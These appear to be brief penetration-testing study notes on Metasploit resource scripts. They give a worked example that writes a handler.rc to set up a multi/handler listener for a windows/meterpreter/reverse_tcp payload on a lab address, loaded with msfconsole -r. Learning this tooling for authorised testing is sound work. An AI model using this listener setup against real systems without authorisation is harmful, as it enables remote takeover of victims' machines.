
#### Metasploit Resource scripts
- Metasploit resources scripts are a great feature of MSF that allow you to automate repetitive tasks and commands.
- The operate similarly to batch scripts,whereby you can specifiy a set of Msfconsole commands that you want to execute sequentially.
- You can load the script with msfconsole and automate the execution of the commands you specified in the resource script.
- We can use resource scripts to automate various tasks like setting up multi handlers as well as loading and executing payloads.



- ls -al /usr/share/metasploit-framework/scripts/resource/ [built in resource scripts found here]

#### creating multi/handler resource scripts
- nano handler.rc
- use multi/handler
- set PAYLOAD windows/meterpreter/reverse_tcp
- set LHOST 10.10.10.5
- set LPORT 1234
- run
- save the file 
- msfconsole -r handler.rc [this will load the created script]


#### Note 
- we can create resource for every module as we need.
